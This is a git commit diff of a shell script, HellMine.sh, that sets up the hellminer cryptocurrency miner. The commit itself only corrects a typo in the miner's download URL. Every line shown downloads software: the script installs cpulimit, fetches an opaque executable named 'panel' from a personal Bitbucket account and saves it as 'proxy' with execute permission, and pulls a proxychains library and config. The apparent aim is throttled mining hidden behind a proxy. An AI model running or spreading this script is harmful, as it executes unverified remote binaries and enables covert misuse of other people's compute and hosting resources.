342ba3376053114209d1d63e7bcbecfd7d7ebd72
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-07-29 09:23:47 +0700

    Update HellMine.sh

--- mnr/cpulimited/400/HellMine.sh
+++ mnr/cpulimited/400/HellMine.sh
@@ -1,5 +1,5 @@
 apt update ; apt install htop neofetch curl cpulimit wget -y
-wget -O hmm.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gzz && tar -xf hmm.tar.gz && mv hellminer hm
+wget -O hmm.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hmm.tar.gz && mv hellminer hm
 wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
